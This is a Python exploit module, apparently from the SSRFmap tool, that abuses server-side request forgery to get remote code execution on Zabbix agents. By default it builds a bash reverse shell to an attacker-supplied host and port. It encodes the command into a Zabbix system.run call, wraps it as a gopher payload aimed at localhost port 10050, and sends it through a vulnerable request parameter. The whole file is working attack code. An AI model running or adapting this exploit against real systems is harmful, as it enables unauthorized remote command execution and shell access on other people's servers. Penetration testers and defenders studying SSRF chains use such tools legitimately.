from ssrfmap.core.utils import *
import logging
import urllib.parse as urllib

# NOTE
# Require `EnableRemoteCommands = 1` on the Zabbix service

name          = "zabbix"
description   = "Zabbix RCE"
author        = "Swissky"
documentation = []

class exploit():
    cmd = "bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        cmd = input("Give command to execute (Enter for Reverse Shell): ")
        if cmd == "":
            if args.lhost == None: 
                self.cmd = self.cmd.replace("SERVER_HOST", input("Server Host:"))
            else:
                self.cmd = self.cmd.replace("SERVER_HOST", args.lhost)

            if args.lport == None: 
                self.cmd = self.cmd.replace("SERVER_PORT", input("Server Port:"))
            else:
                self.cmd = self.cmd.replace("SERVER_PORT", args.lport)
        else:
            self.cmd  = cmd

        # Data for the service
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            port = "10050"
            self.cmd = urllib.quote_plus(self.cmd).replace("+","%20")
            self.cmd = self.cmd.replace("%2F","/")
            self.cmd = self.cmd.replace("%25","%")
            self.cmd = self.cmd.replace("%3A",":")
            data = "system.run[(" + self.cmd + ");sleep 2s]"
            
            payload = wrapper_gopher(data, ip , port)
            logging.info("Generated payload : {}".format(payload))

            # Send the payload
            r = requester.do_request(args.param, payload)